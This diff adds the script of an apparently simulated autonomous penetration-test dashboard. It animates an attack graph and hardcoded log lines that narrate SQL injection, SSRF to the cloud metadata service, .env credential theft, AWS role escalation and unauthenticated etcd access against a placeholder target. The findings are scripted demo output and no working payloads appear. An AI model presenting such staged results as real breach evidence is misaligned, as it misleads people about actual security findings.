+  {x1:218,y1:38,x2:264,y2:20,col:'#ef4444',d:false,cx:false,delay:7200},
+  {x1:218,y1:50,x2:264,y2:48,col:'#f59e0b',d:false,cx:false,delay:7500},
+  {x1:218,y1:62,x2:264,y2:78,col:'#f59e0b',d:false,cx:false,delay:7800},
+  {x1:218,y1:65,x2:264,y2:107,col:'#ef4444',d:false,cx:true,delay:8100},
+  {x1:290,y1:20,x2:352,y2:32,col:'#ef4444',d:false,cx:false,delay:9000},
+  {x1:290,y1:108,x2:352,y2:38,col:'#ef4444',d:false,cx:true,delay:9200},
+  {x1:383,y1:20,x2:420,y2:15,col:'#ef4444',d:false,cx:false,delay:9600},
+  {x1:383,y1:35,x2:420,y2:50,col:'#3b82f6',d:false,cx:false,delay:9900},
+  {x1:355,y1:42,x2:215,y2:155,col:'#8b5cf6',d:false,cx:false,delay:10800},
+  {x1:187,y1:158,x2:151,y2:154,col:'#ef4444',d:false,cx:false,delay:11300},
+  {x1:187,y1:176,x2:151,y2:194,col:'#8b5cf6',d:false,cx:false,delay:11700},
+  {x1:213,y1:176,x2:347,y2:170,col:'#06b6d4',d:false,cx:false,delay:12500},
+  {x1:291,y1:55,x2:347,y2:163,col:'#06b6d4',d:false,cx:true,delay:12700},
+  {x1:151,y1:195,x2:347,y2:173,col:'#06b6d4',d:false,cx:true,delay:12900},
+  {x1:378,y1:158,x2:418,y2:149,col:'#06b6d4',d:false,cx:false,delay:13200},
+  {x1:378,y1:168,x2:418,y2:180,col:'#06b6d4',d:false,cx:false,delay:13500},
+  {x1:378,y1:178,x2:418,y2:211,col:'#ef4444',d:false,cx:false,delay:13800},
+  {x1:432,y1:148,x2:310,y2:244,col:'#ef4444',d:false,cx:false,delay:14600},
+  {x1:350,y1:162,x2:310,y2:244,col:'#ef4444',d:false,cx:false,delay:14800},
+  {x1:282,y1:256,x2:246,y2:262,col:'#ef4444',d:false,cx:false,delay:15200},
+  {x1:310,y1:258,x2:344,y2:261,col:'#ef4444',d:false,cx:false,delay:15500},
+];
+
+function mkEl(tag,attrs){const el=document.createElementNS('http://www.w3.org/2000/svg',tag);for(const[k,v]of Object.entries(attrs))el.setAttribute(k,v);return el;}
+
+function drawEdge(x1,y1,x2,y2,col,dashed,cx,delay){
+  setTimeout(()=>{
+    const s=document.getElementById('gs');
+    const ln=mkEl('line',{x1,y1,x2,y2,stroke:col,'stroke-width':cx?'1':'0.7','marker-end':'url(#ar)'});
+    if(dashed){
+      ln.setAttribute('stroke-dasharray','3 3');
+      ln.setAttribute('stroke-opacity','0.2');
+      ln.setAttribute('stroke-dashoffset','0');
+    } else {
+      ln.setAttribute('stroke-dasharray',cx?'6 3':'400');
+      ln.setAttribute('stroke-dashoffset','400');
+      ln.setAttribute('stroke-opacity',cx?'0.5':'1');
+      ln.style.animation='dl .5s ease forwards';
+    }
+    s.insertBefore(ln,s.firstChild);
+  },delay);
+}
+
+function drawNode(n,delay){
+  setTimeout(()=>{
+    const s=document.getElementById('gs');
+    ND[n.id]=n.data;
+    const g=mkEl('g',{cursor:n.data.sev==='info'?'default':'pointer'});
+    g.style.transformOrigin=`${n.x}px ${n.y}px`;
+    g.style.animation='pn .35s cubic-bezier(.34,1.56,.64,1) forwards';
+    g.style.opacity='0';
+    const r=n.r;
+    const hit=mkEl('circle',{cx:n.x,cy:n.y,r:r+5,fill:'transparent',stroke:'transparent'});
+    const circ=mkEl('circle',{cx:n.x,cy:n.y,r,fill:'#0d1117',stroke:n.col,'stroke-width':'1.5'});
+    const txt=mkEl('text',{x:n.x,y:n.y,'text-anchor':'middle','dominant-baseline':'central','font-size':r>15?'10':'7','font-family':'monospace',fill:n.col});
+    txt.textContent=n.label;
+    g.appendChild(hit);g.appendChild(circ);g.appendChild(txt);
+    if(n.data.sev!=='info'){
+      g.addEventListener('click',()=>openPanel(n.id));
+      g.addEventListener('mouseenter',()=>{
+        circ.setAttribute('stroke-width','2.5');
+        circ.setAttribute('r',String(r+1));
+        document.getElementById('hint').textContent=n.data.title;
+        document.getElementById('hint').style.color='#60a5fa';
+      });
+      g.addEventListener('mouseleave',()=>{
+        circ.setAttribute('stroke-width','1.5');
+        circ.setAttribute('r',String(r));
+        document.getElementById('hint').textContent='click any confirmed node to inspect full asset evidence';
+        document.getElementById('hint').style.color='';
+      });
+    }
+    s.appendChild(g);
+    nd++;document.getElementById('snd').textContent=nd;
+  },delay);
+}
+
+function openPanel(id){
+  const d=ND[id];if(!d)return;
+  document.getElementById('panel').classList.remove('shut');
+  document.getElementById('pt').textContent=d.title||id;
+  const sc=d.sev==='critical'?'sc':d.sev==='high'?'sh':d.sev==='medium'?'sm':'si';
+  let h=`<span class="sev ${sc}">${(d.sev||'info').toUpperCase()}</span>`;
+  if(d.mitre){
+    h+=`<div class="pf"><div class="pl">MITRE ATT&CK</div><div class="pv">${d.mitre} — ${d.technique||''}</div></div>`;
+  }
+  if(d.assets&&d.assets.length){
+    h+=`<div class="pdiv"></div>`;
+    h+=`<div class="pf"><div class="pl"><span class="pl-dot" style="background:#f59e0b"></span>ASSET PROOF</div>`;
+    h+=`<div class="asset-grid">`;
+    d.assets.forEach(a=>{
+      h+=`<span class="ag-k">${a.k}</span><span class="ag-v ${a.c||''}">${a.v}</span>`;
+    });
+    h+=`</div></div>`;
+  }
+  if(d.status){
+    h+=`<div class="pdiv"></div>`;
+    h+=`<div class="pf"><div class="pl">HTTP STATUS</div><div class="pv" style="color:${d.status===200?'#22c55e':'#f59e0b'}">${d.status} OK — confirmed live</div></div>`;
+  }
+  if(d.evidence){
+    h+=`<div class="pf"><div class="pl">EVIDENCE SNIPPET</div><div class="code">${d.evidence}</div></div>`;
+  }
+  if(d.extracted){
+    h+=`<div class="pf"><div class="pl"><span class="pl-dot" style="background:#ef4444"></span>EXTRACTED DATA</div><div class="code" style="color:#ef4444;border-color:rgba(239,68,68,.2)">${d.extracted}</div></div>`;
+  }
+  if(d.curl){
+    h+=`<div class="pf"><div class="pl">REPRODUCE (curl / cli)</div><div class="code">${d.curl}</div></div>`;
+  }
+  if(d.ts){
+    h+=`<div class="pdiv"></div>`;
+    h+=`<div class="pf"><div class="pl">CONFIRMED AT</div><div class="pv" style="color:#475569;font-size:9px">${d.ts}</div></div>`;
+  }
+  if(d.hash){
+    h+=`<div class="proof-hash"><span>SHA-256 evidence seal:</span> ${d.hash}</div>`;
+  }
+  document.getElementById('pb').innerHTML=h;
+}
+
+function closeP(){document.getElementById('panel').classList.add('shut');}
+
+function addRow(agent,ac,msg,mc,ts,delay){
+  setTimeout(()=>{
+    const b=document.getElementById('tb');
+    b.querySelector('.cur')?.closest('.row')?.remove();
+    const r=document.createElement('div');
+    r.className='row';r.style.animationDelay='0ms';
+    r.innerHTML=`<span class="rt">${ts}</span><span class="ra ${ac}">${agent}</span><span class="rm ${mc}">${msg}</span>`;
+    b.appendChild(r);
+    const c=document.createElement('div');c.className='row';
+    c.innerHTML=`<span class="rt"></span><span class="rm dim"><span class="cur"></span></span>`;
+    b.appendChild(c);
+    b.scrollTop=b.scrollHeight;
+  },delay);
+}
+
+function begin(){
+  document.getElementById('so').classList.add('gone');
+  document.getElementById('tgt').textContent='https://target.acme.corp  →  44.218.109.23  (origin: 10.0.1.45)';
+  document.getElementById('sd').className='dot run';
+  document.getElementById('stxt').textContent='scanning';
+  document.getElementById('aact').textContent='300 micro-agents';
+  document.getElementById('tph').style.display='inline';
+  document.getElementById('idle')?.remove();
+  e=0;
+  ti=setInterval(()=>{
+    e++;
+    document.getElementById('sel').textContent=String(Math.floor(e/60)).padStart(2,'0')+':'+String(e%60).padStart(2,'0');
+  },1000);
+
+  EDGES.forEach(ed=>drawEdge(ed.x1,ed.y1,ed.x2,ed.y2,ed.col,ed.d,ed.cx,ed.delay));
+  NODES.forEach((n,i)=>drawNode(n,700+i*280));
+
+  const rows=[
+    ['SYS','as','target resolved: target.acme.corp → 44.218.109.23 (Cloudflare) · origin: 10.0.1.45','dim','00:00',200],
+    ['RECON','ar','47 endpoints · Node.js 20.11 · PostgreSQL 15.3 · AWS us-east-1 · K8s v1.28','ok','00:02',1400],
+    ['RECON','ar','Cloudflare origin IP exposed via CF-Connecting-IP header bypass','warn','00:02',2200],
+    ['EXPLOIT','ae','SQLi confirmed — 44.218.109.23:443 /api/users/search — HTTP 200, 847 rows leaked','crit','00:05',4800],
+    ['EXPLOIT','ae','SSRF confirmed — 169.254.169.254 (IMDSv1) reachable from server: i-0a1b2c3d4e5f67890','crit','00:06',5800],
+    ['EXPLOIT','ae','/.env HTTP 200 — AWS_KEY (AKIAIOSFODNN7EXAMPLE), DB_PASS, JWT_SECRET extracted','crit','00:07',7000],
+    ['CLOUD','ac','sts:AssumeRole → arn:aws:iam::123456789012:role/OrgAdmin → AdministratorAccess','crit','00:09',9400],
+    ['CLOUD','ac','S3 acme-customer-data-prod — public-read ACL, 847k objects, 2.3TB accessible','crit','00:10',10100],
+    ['CLOUD','ac','K8s 10.0.2.100:6443 accessible · priv pod on node 10.0.2.15 (ip-10-0-2-15.ec2.internal)','crit','00:11',11100],
+    ['CLOUD','ac','etcd 10.0.2.5:2379 — no auth — 23 secrets readable including db-credentials, redis-auth','crit','00:12',11900],
+    ['LATERAL','al','postgres 10.0.3.22:5432 · redis 10.0.3.45:6379 · admin-api 10.0.4.8:8080 — all confirmed','crit','00:14',13600],
+    ['SYS','as','4 subnets reached · 2.3M records · risk grade F · sealing engagement package','crit','00:15',14700],
+  ];
+  rows.forEach(r=>addRow(...r));
+
+  setTimeout(()=>{
+    fn=19;cr=6;
+    document.getElementById('sf').textContent=fn;
+    document.getElementById('scr').textContent=cr;
+    document.getElementById('sgr').textContent='F';
+    document.getElementById('sgr').style.color='#ef4444';
+    clearInterval(ti);
+    document.getElementById('sd').className='dot done';
+    document.getElementById('stxt').textContent='breach confirmed';
+  },15400);
+}
+</script>
+</body>
+</html>
